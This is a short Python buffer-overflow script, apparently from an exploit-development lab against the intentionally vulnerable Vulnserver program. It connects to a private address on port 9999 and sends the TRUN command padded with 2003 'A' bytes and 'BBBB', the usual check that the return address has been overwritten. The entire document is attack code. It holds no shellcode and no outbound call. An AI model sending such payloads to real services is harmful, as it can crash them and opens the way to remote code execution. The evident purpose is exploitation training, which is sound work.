import socket
import sys


buffer = b"A"*2003
buffer += b"BBBB"

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + buffer))  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
